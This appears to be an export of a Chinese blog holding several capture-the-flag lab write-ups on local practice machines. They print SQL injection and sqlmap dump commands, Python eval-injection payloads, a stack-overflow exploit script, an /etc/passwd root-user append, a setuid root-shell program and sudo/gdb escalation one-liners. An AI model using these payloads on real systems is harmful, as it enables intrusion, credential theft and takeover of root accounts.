访问是一个聊天界面登录可以聊天\n这里并不能突破\n突破点在外面的登录框做了这么久不要忘记SQL注入了\n这里附上PAYLOAD\njerry\u0026#39; or 1=1 -- jerry\u0026#39; or 1=1 #\r# 是最可靠的特殊情况注释方案\r-- (带空格) 是最安全、兼容性最好的标准注释方式\r--+ 依赖 Web 服务器的 URI 解码特性\r这里密码不用输入了因为sql注入修改了SQL语句\rWHERE username = \u0026#39;admin\u0026#39; -- 注释了后面的密码\u0026#39; AND password = \u0026#39;任何密码\u0026#39;\rPOST /login.php HTTP/1.1\rHost: 172.20.10.3\rOrigin: http://172.20.10.3\rReferer: http://172.20.10.3/index.php?registered\rCookie: PHPSESSID=0l25og4fd06guunjegg65raeb0\rCache-Control: max-age=0\rContent-Type: application/x-www-form-urlencoded\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\rAccept-Language: zh-CN,zh;q=0.9\rUpgrade-Insecure-Requests: 1\rAccept-Encoding: gzip, deflate\rContent-Length: 44\rusername=jerry*\u0026amp;password=1\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --current-db\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --current-db --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --tables -D \u0026#34;chat\u0026#34; --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --columns -T \u0026#34;user\u0026#34; -D \u0026#34;demo01\u0026#34; --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --columns -T \u0026#34;user\u0026#34; -D \u0026#34;chat\u0026#34; --batch\rpython sqlmap.py -r 123.txt --risk 3 --level 3 --dump -C \u0026#34;username,password,userid\u0026#34; -T \u0026#34;user\u0026#34; -D \u0026#34;chat\u0026#34; 获取密码我们跑就行\n拿到shell权限 # 拿root # 也可以拿公钥\n总结一下 # 1：别忘了SQL注入\n","date":"20 June 2025","externalUrl":null,"permalink":"/posts/talk/","section":"Posts","summary":"","title":"talk靶机---难度easy知识点-SQL注入","type":"posts"},{"content":" matrix靶机\u0026mdash;难度easy知识点-表达式注入 # Nmap扫描发现端口开放 # 我们访问看下80没用 我们看5000这里注入下这个输入框\n这里输入引号直接报错了我们可以试试表达式注入因为是一python脚本\n这里试试PAYLOAD\n\u0026#39; + __import__(\u0026#34;os\u0026#34;).popen(\u0026#34;whoami\u0026#34;).read() + \u0026#39; 这里给出源码\ndef dynamic_execute(type_str, expression):\rcommand = \u0026#34;%s\u0026#39;%s\u0026#39;\u0026#34;%(type_str,expression) # 拼接出要执行的命令\rprint(command)\rreturn eval(command) # 执行拼接后的命令\r@app.route(\u0026#39;/message\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;])\rdef handle_message():\rif request.method == \u0026#39;GET\u0026#39;:\rreturn render_template(\u0026#39;message.html\u0026#39;) # 渲染留言页面\relse:\rmessage_type = request.form[\u0026#39;type\u0026#39;][:1] # 获取留言类型\ruser_message = request.form[\u0026#39;msg\u0026#39;] # 获取用户留言内容\rusername = \u0026#34;Guest\u0026#34; # 默认用户名为 Guest\rresult = dynamic_execute(message_type, user_message) # 动态执行用户输入的内容\rreturn render_template(\u0026#39;message.html\u0026#39;, msg=result, status=f\u0026#39;{username},留言成功\u0026#39;)\r### 我们输入这个\u0026rsquo; + import(\u0026ldquo;os\u0026rdquo;).popen(\u0026ldquo;whoami\u0026rdquo;).read() + \u0026rsquo; 是msg的\n则数据是\nu\u0026rsquo;import(\u0026ldquo;os\u0026rdquo;).popen(\u0026ldquo;whoami\u0026rdquo;).read()\u0026rsquo; 则执行这个代码 uicode就是string类型所以成功执行\n放入进去是u\u0026rsquo;\u0026rsquo; + import(\u0026ldquo;os\u0026rdquo;).popen(\u0026ldquo;whoami\u0026rdquo;).read() + \u0026rsquo;\u0026rsquo; = 但是在python2里面前面放入unicode可以但是在py3中会Unicode未定义可能依赖里面设置了可以\n或者[type][1][1]这里获取的是第一个字符也就是说你输入unicode=u 那么你输入f是不是格式化输出呢\n所以又一个PAYLOAD\nmsg={os.system(\u0026#34;whoami\u0026#34;)}\u0026amp;type=f 所以总结下 两种\nmsg={os.system(\u0026ldquo;whoami\u0026rdquo;)}\u0026amp;type=f 格式化输出\nmsg=\u0026rsquo;+(os.popen(\u0026ldquo;pwd\u0026rdquo;).read()+\u0026rsquo;\u0026amp;type=unicode 拼接替换\n拿到shell权限 # 发现ROOT也有开了一共服务本地可以访问的8000端口\n这里通过socat转发代码如下\n./socat TCP-LISTEN:8080,fork TCP4:127.0.0.1:8000 \u0026amp; 而且还给了源码我们来分析下\n注意注意 这里我们PAYload不能用unicode的那个了因为过滤了空格不能闭合了 我们用第二个可以读取\ndef dynamic_execute(type_str, expression):\rcommand = \u0026#34;%s\u0026#39;%s\u0026#39;\u0026#34;%(type_str,expression) # 拼接出要执行的命令\rprint(command)\rreturn eval(command) # 执行拼接后的命令\r@app.route(\u0026#39;/message\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;])\rdef handle_message():\rif request.method == \u0026#39;GET\u0026#39;:\rreturn render_template(\u0026#39;message.html\u0026#39;) # 渲染留言页面\relse:\rmessage_type = request.form[\u0026#39;type\u0026#39;][:1] # 获取留言类型\ruser_message = request.form[\u0026#39;msg\u0026#39;] # 获取用户留言内容\rusername = \u0026#34;Guest\u0026#34; # 默认用户名为 Guest\rif len(user_message) \u0026gt; 35: # 如果留言太长\rreturn render_template(\u0026#39;message.html\u0026#39;, msg=\u0026#39;留言太长了！\u0026#39;, status=\u0026#39;留言失败\u0026#39;)\ruser_message = user_message.replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;_\u0026#39;, \u0026#39;\u0026#39;) # 移除空格和下划线\rresult = dynamic_execute(message_type, user_message) # 动态执行用户输入的内容\rreturn render_template(\u0026#39;message.html\u0026#39;, msg=result, status=f\u0026#39;{username},留言成功\u0026#39;)\r### 但是这里有长度限制我们可以\nchmod +s /biin/bash \u0026gt;a 给到tmp文件下a 文件然后执行\n拿root # 这里群主给了另一方法\n修改etc/passwd权限通过 0o666表示八进制 linux里面权限也是八进制所以权限是rw-rw-rw\n发现可写了\npayload 密码123456\necho \u0026#39;ll:$y$j9T$ExvEUV2wz6oo99qy/ZJc61$4CBi7jCbWQ.pBlG9vmnhH0z3.uchXkOXaFIl9Zz5Y18:0:0:xxoo,,,:/root:/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd 总结一下 # 1：多学学python\n","date":"19 June 2025","externalUrl":null,"permalink":"/posts/matrix/","section":"Posts","summary":"","title":"matrix靶机---难度easy知识点-表达式注入","type":"posts"},{"content":" insomnia靶机\u0026mdash;难度easy知识点-分号截断 # Nmap扫描发现端口开放 8080然后我们访问看下是什么 # NMAP扫描 我们访问发现一个网页感觉没什么关键地方\n这里我们注意下！ 我们扫这网站因为他404也返回200导致扫描工具不能用 我们可以设置不要返回那个数字来避免 NMAP扫描 比如gobuster\ngobuster dir -u http://172.20.10.2:8080 \\\r-w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \\\r-x php,txt \\\r--exclude-length 2899 避免长度2899的显示我们发现三个文件\nNMAP扫描 其中关键的文件是这个administration.php\nNMAP扫描 关于这个主页面不是你输入什么然后显示什么吗 然后我试了很多比如\n1：SQL注入 2：SSRF\n3：模板注入\n都不行 然后 很奇怪的就来了 我直接用gobuster扫描发现你\n每当你扫描一次他会往对话框放入都是都是空格 这里各位大佬应该都有思路了 用FUZZ下\nNMAP扫描 然后我们发现了一个logfile文件我们加上参数过去果然啊 我输入1聊天就显示1\nNMAP扫描 然后我试了很多比如logfile=\u003c?php phpinfo()?\u003e 都不行\n然后我们可以试试用sleep来看是不是没有回显比如\nlogfile=;sleep 5; 发现真的延迟了然后直接busybox nc 反弹shell\n拿到shell权限 # 我们拿到SHELL可以看看源码\nNMAP扫描 发现是直接拼接\n我们用linpeas跑一下发现可以用这个sh文件 而且这文件是我们可以写的那就很简单了\nNMAP扫描 文件写入/bin/bash 然后拿到julia\nNMAP扫描 拿root # 因为可以看bash_history我们看下历史记录发现了再往定时任务反弹\nNMAP扫描 然后我们使用下面程序来查看发现可以有一个sh文件被ROOT用户用/bin/bash来运行\npspy64 /bin/sh -c /bin/bash /var/cron/check.sh\n用sh来执行命令\nNMAP扫描 而且这文件我们可写\n我们直接往里面写入命令如\nchmod +s /bin/bash 发现成功拿到SUID权限\n提权成功\n/bin/bash -p 总结一下 # 1：多用用；截断 ,多观察联动性\n","date":"17 June 2025","externalUrl":null,"permalink":"/posts/insomnia/","section":"Posts","summary":"","title":"insomnia靶机---难度easy知识点-分号截断","type":"posts"},{"content":" pwn-tools first - 第一次 # 这里因为我也是第一次玩PWN的题目所以也是看群主的视频来学习 先看步骤后面总结会解释\n然后我们NC下 试试发现是一个NC 这里要输入250次经过测试\n这里你可以写PY脚本 也可以用 PWN\n这里附上代码\nfrom pwn import *\rimport re\rr=remote(\u0026#34;172.20.10.2\u0026#34;,1337)\rfor i in range(250):\rprint(i)\ra = r.recvuntil(b\u0026#39;: \u0026#39;).decode()\rprint(a)\rx = re.split(\u0026#39;/[|/]\u0026#39;,a)\rr.sendline(x[1].encode())\rr.interactive() 拿到密码得到SHELL\n然后这里程序我们先把发送出来 然后IDEA反编译下\n得到主函数然后左边有一个fun 函数点开看看\n发现了要利用的函数因为主函数有一个gets没有检测输入个数我们利用下栈溢出\n栈溢出代码如下\n代码如下\nfrom pwn import *\rimport re\rr=remote(\u0026#34;172.20.10.2\u0026#34;,12345)\rjunk = b\u0026#39;A\u0026#39; * 23\rfun = p64(0x401186)\rpayload = junk + fun\rr.recvuntil(b\u0026#39;please input/n\u0026#39;)\rr.sendline(payload)\rr.interactive() 拿到ROOT\n我们拿到了ROOT我来解释下原理\n当你不停的往这个数组放入数值时 满的时候他会到缓冲区拿去数据 我们就是来控制缓冲区的数据找到那个临界值爆发后我们控制的值 我们上面图算出来了是23\n如何计算？\n使用\npwndbg /opt/find_backdoor r 然后输入一长串有规则数据生成可以使用代码\npython3 -c \u0026#34;from pwn import cyclic; print(cyclic(100))\u0026#34; b\u0026#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\u0026#39; 然后我们放入进去\n可以看爆出了 ret\n下面那个6161686161616761是爆发值\n然后我们使用工具来看偏移量是多少\npython3 -c \u0026#34;from pwn import *; print(cyclic_find(0x6161686161616761))\u0026#34; 算出23 所以我们POC代码就是23个A加上函数地址\n总结一下 # 1：从输入的哪一位开始，覆盖了返回地址（RIP）\n2：当你利用栈溢出攻击程序时：你要精确填满前面的内容，刚好覆盖返回地址所以必须知道这个“偏移值”\n","date":"17 June 2025","externalUrl":null,"permalink":"/posts/tool-pwn/","section":"Posts","summary":"","title":"pwn-tool","type":"posts"},{"content":"","date":"17 June 2025","externalUrl":null,"permalink":"/tags/%E5%88%86%E5%8F%B7%E6%88%AA%E6%96%AD/","section":"Tags","summary":"","title":"分号截断","type":"tags"},{"content":" Locker靶机\u0026mdash;难度easy知识点-分号截断,Sulogin # Nmap扫描发现端口开放 # NMAP扫描 我们访问发现一个网页感觉没什么关键地方\nNMAP扫描 这里穿越啊 注入啊 包含 都不行\nNMAP扫描 结果使用分号截断\nNMAP扫描 所以平时多用分号没问题\n拿到shell权限 # 我们到web权限查看发现一个sulogin\nNMAP扫描 sulogin: 用于 单用户模式下获取 root 权限 如\n系统故障修复（如忘记 root 密码时重置密码）。 维护模式下执行特权操作（需通过安全验证）。 它可以直接读取环境变量里面的值\n例如：export SUSHELL=/tmp/恶意程序 \u0026amp;\u0026amp; sulogin 会直接执行 /tmp/恶意程序。\n工具 环境变量依赖 执行逻辑 安全设计目的 sulogin 仅依赖 自定义变量 直接执行指定路径的程序 避免被 PATH 注入恶意程序 cat 等命令 依赖 PATH 按 PATH 顺序搜索可执行文件 提供用户自定义路径的灵活性 拿root # 我们用老版本的C语言编写一个设置系统命令的代码\nC语言代码\n#include\u0026lt;stdio.h\u0026gt; // 基础输入输出库\r#include\u0026lt;stdlib.h\u0026gt; // 提供 system() 等函数，用于执行系统命令\r#include\u0026lt;unistd.h\u0026gt; // 提供 setuid()、setgid() 等系统调用\rint main(){\rsetuid(0); // 将进程的有效用户 ID 设置为 0（root 用户的 UID）\rsetgid(0); // 将进程的有效组 ID 设置为 0（root 组的 GID）\rsystem(\u0026#34;/bin/bash\u0026#34;); // 执行 /bin/bash，启动一个新的 Shell\r} NMAP扫描 为什么要建立C文件\n区别：C 程序通过 setuid(0) 直接修改进程权限，而 Shell 脚本依赖外部机制（如 SUID 权限）间接提权。 我们WGET下来添加X 后 记得导入环境变量SUSHELL是我自定义的变量他会优秀读取后读/etc/passwd的root\nNMAP扫描 总结一下 # 1：多用用；截断\n2：sulogin是 Linux 系统中专门用于单用户模式的登录程序，路径为/sbin/sulogin。当系统进入单用户模式时，会自动调用 sulogin`，要求用户输入 root 密码（部分旧系统可直接进入）。 这靶机把root锁定了不能SU ROOT 感叹号可以把root锁定在/etc/shadow里面\nroot:!:18649:0:99999:7::: # 表示 root 被锁定 本身可以-e 获得权限可能被锁定了就不行\nSUSHELL是sulogin调用的另一个环境变量 手动指定就行\n3：单用户模式是操作系统的一种特殊启动状态，仅允许一个超级用户（root）登录系统，且不加载网络服务、图形界面等非必要组件\n4：sulogin 和 path 的区别\n​\t4.1sulogin 会执行你的命令 安全风险- 依赖 PATH 可能引入路径遍历风险\n​\t4.2path会找命令的程序找到就执行 比如 CAT他就会在如BIN里面找 安全风险 - 环境变量修改\n","date":"12 June 2025","externalUrl":null,"permalink":"/posts/locker/","section":"Posts","summary":"","title":"Locker靶机---难度easy知识点-分号截断,Sulogin","type":"posts"},{"content":"","date":"12 June 2025","externalUrl":null,"permalink":"/tags/sulogin/","section":"Tags","summary":"","title":"Sulogin","type":"tags"},{"content":" vulny靶机\u0026mdash;难度easy知识点-file-manager # Nmap扫描发现端口开放 # 3333端口和一个mysql 我们上去网页 我先测试的无密码访问是不行的然后我们访问网页\nNMAP扫描 这里发现我们输入什么他就显示什么比如你输入123就在home的123 可以试试看目录穿越但是没出来 我们得到了一个思路 爆破用户名呗\nNMAP扫描 这里我用dirsearch 扫描出来有一个secret目录\nNMAP扫描 但是还是什么都没有 因为dirsearch扫描很多wordpress我就用Nuclei扫描了下发现了一个CVE\nNMAP扫描 利用链接：CVE-2020-25213 WordPress远程代码执行漏洞复现 - Salvere - 博客园\n利用这个CVE上传文件然后访问试试\nNMAP扫描 NMAP扫描 然后就很简单的反弹就行\n拿到shell权限 # 拿到我马上就去翻web-config这是wordpress的配置文件因为 他有mysql 然后 我肯定先去看看 结果翻了20分钟 没发现 看了眼WP结果..是注释\n在/usr/share/wordpress/wp-config.php 文件 居然是注释 真没看到\nNMAP扫描 拿root # NMAP扫描 很简单FLOCK 直接可以搜到\nhttps://gtfobins.github.io/gtfobins/flock/#sudo\nsudo flock -u / /bin/sh NMAP扫描 总结一下 # 1：多看看注释吧\n2：CVE-wp-file-manager 这是一个插件 在web你可以下载还可以看到源码 影响版本 6.0-6.8\n3：flock 是 Linux 系统中用于文件锁定的命令 -u 表示解锁 文件 -c 也可以执行命令如\nsudo /usr/bin/flock /tmp/mylock -c \u0026#34;cat /root/root.txt\u0026#34; ","date":"12 June 2025","externalUrl":null,"permalink":"/posts/vulny/","section":"Posts","summary":"","title":"vulny靶机---难度easy知识点-file-manager","type":"posts"},{"content":"","date":"12 June 2025","externalUrl":null,"permalink":"/tags/wordpress/","section":"Tags","summary":"","title":"Wordpress","type":"tags"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/tags/fuzz/","section":"Tags","summary":"","title":"Fuzz","type":"tags"},{"content":"","date":"11 June 2025","externalUrl":null,"permalink":"/tags/ln/","section":"Tags","summary":"","title":"Ln","type":"tags"},{"content":" observe靶机\u0026mdash;难度low知识点-fuzz # 只做了WEB 后面linux的苦手了\nNmap扫描发现端口开放 # 3333端口和一个SSH我们上去网页\nNMAP扫描 这里发现我们输入什么他就显示什么比如你输入123就在home的123 可以试试看目录穿越但是没出来 我们得到了一个思路 爆破用户名呗\nNMAP扫描 我们使用FUZZ来爆破下用户名 后缀就写.bash_history 用户名jan\nwfuzz -w /usr/share/zidian/SecLists-2023.2/Usernames/xato-net-10-million-usernames.txt -u http://172.20.10.2:3333/FUZZ/.bash_history \u0026ndash;hw 8\nNMAP扫描 网页查看下\nNMAP扫描 然后读下ssh的公钥我们直接登录\nNMAP扫描 拿到shell权限 # NMAP扫描 这里有一个systemctl 但是我没法提权后面看WP了\n拿root # 这里有一个ROOT进程的observe进程 我们的那个网页就是用root运行的 我们可以直接用网页来读取\nNMAP扫描 NMAP扫描 NMAP扫描 总结一下 # 1：多看看进程\n2：软连接命令 ln -sv /root xxoo\n","date":"11 June 2025","externalUrl":null,"permalink":"/posts/observer/","section":"Posts","summary":"","title":"observe靶机---难度low知识点-fuzz-ln","type":"posts"},{"content":"","date":"3 June 2025","externalUrl":null,"permalink":"/tags/base64/","section":"Tags","summary":"","title":"Base64","type":"tags"},{"content":" flower靶机\u0026mdash;难度low知识点-base64-py # 多思考\nNmap扫描发现端口开放 # 这里只有一个80我们上去发现是一个点击后显示花瓣的文件 （dirsearch扫出来很多没用的）\nNMAP扫描 我们可以抓包看看怎么显示的\nNMAP扫描 发现是base64的 解密出来是1+2 我们直接试试改其他的发现也可以 然后直接system(\u0026lsquo;whoami\u0026rsquo;) 发现可以\nNMAP扫描 NMAP扫描 好了WEB结束\n拿到shell权限 # sudo -l 发现可以执行py脚本是一个写入序列化的数据 琢磨了很久 最后不会了看的WP 是挟持import文件\nimport pickle\ndiary = {\u0026ldquo;November28\u0026rdquo;:\u0026ldquo;i found a blue viola\u0026rdquo;,\u0026ldquo;December1\u0026rdquo;:\u0026ldquo;i lost my blue viola\u0026rdquo;} p = open(\u0026lsquo;diary.pickle\u0026rsquo;,\u0026lsquo;wb\u0026rsquo;) pickle.dump(diary,p)\n我们挟持这个文件 他的目录可以写入文件就离谱\nNMAP扫描 拿root # 得到ROSE然后又可以执行 .plantbook 这是一个写入什么打印的脚本\n但是很关键\u0026mdash;\u0026hellip;\u0026hellip; 我也没想出来 这文件是我们的我们可以修改啊 \u0026mdash;-\nNMAP扫描 拿下了\n总结一下喽 # 1：多看看数据包\n2：多试试目录功能\n3：Import劫持学到了 看看权限明明可以写入的\n","date":"3 June 2025","externalUrl":null,"permalink":"/posts/flower/","section":"Posts","summary":"","title":"flower靶机---难度low知识点-base64-py","type":"posts"},{"content":"","date":"3 June 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/logic/","section":"Tags","summary":"","title":"Logic","type":"tags"},{"content":" mixue靶机\u0026mdash;难度群友知识点-logic-monitor # 你爱我我爱你蜜雪冰城甜蜜蜜\nNmap扫描发现端口开放 # NMAP扫描 直接登录然后dirsearch不要停\nNMAP扫描 好经典的登录界面啊别说了开扫\nNMAP扫描 一扫不知道啊 没扫中。。。。看看网页发现一个用户sublarge 他是弱口令 123456上去了\nNMAP扫描 这种很简单 看数据包 发现是通过cookie里面值来判断的 但是注意你修改都要把0改为1\nNMAP扫描 NMAP扫描 好了WEB结束了我们拿到了shell\n拿到shell权限 # NMAP扫描 翻文件发现了密码然后我们运行下pspy64发现一直在运行monitor\nNMAP扫描 NMAP扫描 看看什么意思 意思是编辑了key就执行change.sh (下面那个root是我做完看的)\n这是suraxddq的文件 我们试试同一个密码可以上去不 发现可以 然后可以\n拿root # 下面是change.sh的作用 就是给权限 我们可以直接复制bash然后-p运行\nNMAP扫描 NMAP扫描 拿到了root了\n总结一下喽 # 1：多看看数据包\n2：monitor 是一个监控的程序\n3：pspy64可以看进程 前面有具体用户号\n4：密码复用\n","date":"2 June 2025","externalUrl":null,"permalink":"/posts/mixue/","section":"Posts","summary":"","title":"mixue靶机---难度群友知识点-logic-monitor.我冰城呢","type":"posts"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/monitor/","section":"Tags","summary":"","title":"Monitor","type":"tags"},{"content":"","date":"29 May 2025","externalUrl":null,"permalink":"/tags/sqlmap/","section":"Tags","summary":"","title":"Sqlmap","type":"tags"},{"content":" ximai靶机\u0026mdash;难度easy-medium-知识点-wp-sqlmap-wpplugin # 这里应该有很多步骤拿shell 但我好像选择了最难的\nNmap扫描发现3个端口开放 # 看到这里你肯定笑嘻了 肯定是mysql skip对吧但是没有卵用\nNMAP扫描 如图所示 mysql上不去\nNMAP扫描 那就经典的扫描目录加上登录网站看看什么内容\n80是一个经典的apache目录这里不说了\n\u0026ndash;你的字典不行啊有一个提示没扫出来\u0026hellip; reminder.php 这里有个这个文件网站但是我没用上..\nNMAP扫描 这里有info.php但是我没有用到 有一个adminer.php 是一个登录数据库的网站\nNMAP扫描 这里我用了包含因为前面PHP包含打开了 但是没用上，然后sql注入试了试也不行就放弃了转向8000端口 是个wordpress 注意改域名\n扫描下目录\nNMAP扫描 1:这里发现很多东西但是我也没找到什么东西能用上- 这时候就用用wpscan扫描一下 只扫了一个用户adminer\n2:插件扫太久了 卡了很久 问了下老哥 就用了下nuclei 没想到直接爆出来了\n​\tNMAP扫描 就是这个CVE2015 这里还有poc 你拿去访问下发现直接爆出了 数据库名字\n​\tNMAP扫描 这里直接启动sqlmap 但是注意你也要分析下这个poc 我通过yakit保存了数据包然后 -r 来使用要在参数后面加*\nNMAP扫描 1：后面用sqlmap读取了数据库wp密码但是我不会解密 试了os 也不行 又试了试文件读取可以\npoc:\npython .\\sqlmap.py -r .\\1234.txt \u0026ndash;level 4 \u0026ndash;risk=2 \u0026ndash;file-read=\u0026quot;/etc/passwd\u0026quot;\n2：注意看文件保存位置然后发现了两个用户 一共jimmy 一个 adminer 然后经典的爆破直接不行 好吧\n3：然后因为这是个WP有wp-config这个文件的 但是我不知道位置 就只能一个个试 在/var/www/wordpress/wp-config.php 里面读出来然后有数据库的密码\nNMAP扫描 我们上到这里来改wp用户的密码 注意它是md5 所以你要把密码加密为md5放上去才行 这里我放的是111\n然后我们登录wp\nNMAP扫描 wp反弹shell 一般都是写插件 这里我试了下\n4m3rr0r/Reverse-Shell-WordPress-Plugin: A WordPress plugin that provides reverse shell functionality with a graphical user interface (GUI) for configuration. This plugin allows users to configure and initiate a reverse shell connection to a specified IP address and port.\n发现用不了又试了试下面这个payload\nNMAP扫描 然后放到压缩文件里面 上传 他直接自动执行了 记得激活\n拿到shell权限 # NMAP扫描 这里作者给了adminer的密码 adminer123456 可能有bug 直接给我了\n拿root # NMAP扫描 这里sudo 可以使用grep 但是什么都做不了\nNMAP扫描 但是但是你注意到了没有\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;他可写\u0026hellip;\nNMAP扫描 这里grep里面写的是nc命令\n然后那边nc监听即可\nNMAP扫描 总结一下喽 # 1：懵懵懂懂的 熟悉下sqlmap\n2：wp的插件反弹shell\n3：数据库md5 修改用户\n4：看文件可不可写\n","date":"29 May 2025","externalUrl":null,"permalink":"/posts/ximai/","section":"Posts","summary":"","title":"ximai靶机---难度LOW-easy-知识点-wp-sqlmap-wpplugin","type":"posts"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/socat/","section":"Tags","summary":"","title":"Socat","type":"tags"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/tmp/","section":"Tags","summary":"","title":"Tmp","type":"tags"},{"content":" translate靶机\u0026mdash;难度LOW-easy-知识点-tmp-定时任务-socat # 只做了user\nNmap扫描发现3个端口开放 # NMAP扫描 ​ 一访问发现是个软蛋 扫描一下目录\n​\tNMAP扫描 这里发现了 一个登录框但是没有爆破也没用，我们访问一下5001端口可以也dir一下发现info目录\n​\tNMAP扫描 进入叫我们可以构造数据包访问可以获取数据\n我们可以curl http://172.20.10.2:5001 -X POST -H \u0026lsquo;Content-Type: application/json\u0026rsquo; -d \u0026lsquo;{\u0026ldquo;source_lang\u0026rdquo;:\u0026ldquo;a\u0026rdquo;,\u0026ldquo;target_lang\u0026rdquo;:\u0026ldquo;x\u0026rdquo;,\u0026ldquo;text_list\u0026rdquo;:[\u0026ldquo;就你也想要账号？？？？\u0026rdquo;]}\u0026rsquo; 这个可以获得密码\n也可以 就你也想要账号？？？？ 直接换成系统命令 因为你改命令发现可以执行\n拿到账号密码\n1：可以登录那个窗口弹shell\n2：通过上面直接拿shell 都可以\n拿到shell权限 # 我们拿到权限翻啊翻我翻到opt里面有 pspy64 进程查看工具可以查看定时任务等进程\n​\tNMAP扫描 发现在执行/tmp/bash\tNMAP扫描 look look\n1: www的 tmp目录的和普通用户的是不同的 所以你直接把命令写到tmp是不行的 我们需要一个正常用户他是可以访问tmp的\n我们访问家目录发现有一个网页开了8000端口但是我们主机访问不到我们socat一下端口转发\nNMAP扫描 把文件写到user.txt里面然后mv\n我们主机可以访问了因为这个程序是welcome的权限 并且可以执行mv 这就是解题最优解在这里\nNMAP扫描 2:同时因为是welcome的权限可以访问正常tmp所以反弹成功\n拿root # NMAP扫描 总结一下喽 # 1：ss -lntup 查看端口进程 | socat 可以转发端口 | pspy64 不用root可以看定时任务等\n2：tmp目录www是隔离的 和 普通用户不同\nNMAP扫描 www的文件在这里被apache隔离了\n","date":"28 May 2025","externalUrl":null,"permalink":"/posts/translate/","section":"Posts","summary":"","title":"受益匪浅translate靶机---难度LOW-easy-知识点-tmp-定时任务-socat","type":"posts"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/","section":"Tags","summary":"","title":"定时任务","type":"tags"},{"content":" baseme靶机\u0026mdash;难度LOW-知识点-爆破ssh密钥-base64语法- # Nmap扫描发现 # 经典组合上网页看看\nNMAP扫描 进入网页解密上面的base64 提示了\n：ALL, absolutely ALL that you need is in BASE64. Including the password that you need :) Remember, BASE64 has the answer to all your questions. -lucas\n这里获得了一个用户lucas 提示到了包含base64 可能是用base64来跑目录 既然都提到了base64我们把下面提示来base64来跑一下lucas密码发现不行\nNMAP扫描 使用下面语法 来把字典变为base64来跑一下目录\nat /usr/share/dirb/wordlists/common.txt|awk \u0026lsquo;{system(\u0026ldquo;echo \u0026ldquo;$0\u0026rdquo;|base64\u0026rdquo;)}\u0026rsquo; \u0026gt; b.txt\nNMAP扫描 发现跑到了翻译下是id_rsa私钥我们拿着私钥反编译base64登录发现要密码\nNMAP扫描 记得私钥给权限700不然用不了\n我们使用ssh-keygen -y -f id_rsa2 发现确实要密码\n但是我们一开始不是拿到了一些字符吗那个base64来解密一下试试\n先把私钥转换base64使用 ssh2john\nNMAP扫描 成功跑到密码 如果john卡了就ps一下 kill -9 进程号\nNMAP扫描 拿到shell权限 # 我们拿到私钥登录\nNMAP扫描 发现可以用base64\n拿root # 这里思路 我们可以直接拿root.txt\nsudo /usr/bin/base64 \u0026lsquo;/root/root.txt\u0026rsquo; | base64 \u0026ndash;decode\n也可以判断对方root有auth文件 我们拿私钥试试\nNMAP扫描 拿到后给权限登录就行\nNMAP扫描 总结一下 # 1：awk编辑文本命令 awk \u0026lsquo;{system(\u0026ldquo;echo \u0026ldquo;$0\u0026rdquo;|base64\u0026rdquo;)}\n2：ssh私钥是可以加密的 不要忘了 ssh2john来解密\n","date":"26 May 2025","externalUrl":null,"permalink":"/posts/baseme/","section":"Posts","summary":"","title":"baseme靶机---难度LOW-知识点-爆破ssh密钥-base64语法-","type":"posts"},{"content":" connection靶机\u0026mdash;难度LOW-知识点-smb-enm4linux # Nmap扫描发现 # NMAP扫描 发现了经典的445\n你可以\nsmbclient -L //172.20.10.2 -N 匿名访问查看分享内容\n也可以\nenum4linux 172.20.10.2 工具分析\n发现了一个目录叫share进去可以上传文件我们上传一个php脚本或者shell\nsmbclient //172.20.10.2/share 直接登录回车\nNMAP扫描 拿到shell权限 # 不知道为什么弹半天弹不上 用python可以弹上\nNMAP扫描 拿root # 上传扫描文件linepas 发现有一个suid权限的gdb\ngdb -nx -ex \u0026#39;python import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-p\u0026#34;)\u0026#39; -ex quit 输入代码提权\nNMAP扫描 总结一下 # 1：smb -L 查看分享的东西 -N 匿名\n","date":"26 May 2025","externalUrl":null,"permalink":"/posts/connection/","section":"Posts","summary":"","title":"connection靶机---难度LOW-知识点-smb-enm4linux","type":"posts"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/creatab/","section":"Tags","summary":"","title":"Creatab","type":"tags"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/smb/","section":"Tags","summary":"","title":"Smb","type":"tags"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/ssh2john/","section":"Tags","summary":"","title":"Ssh2john","type":"tags"},{"content":"","date":"26 May 2025","externalUrl":null,"permalink":"/tags/tftp/","section":"Tags","summary":"","title":"Tftp","type":"tags"},{"content":" dayao靶机-知识点-tftp69-定时任务 # Nmap扫描发现两个端口开放 # NMAP扫描 ​ 访问一下网址(他提示了目录穿越)\n​\tNMAP扫描 ​\n​ 同时dirsearch一下 这里的a和passwd和phpinfo是我后面写的 发现有一个file.php和upload.php\nNMAP扫描 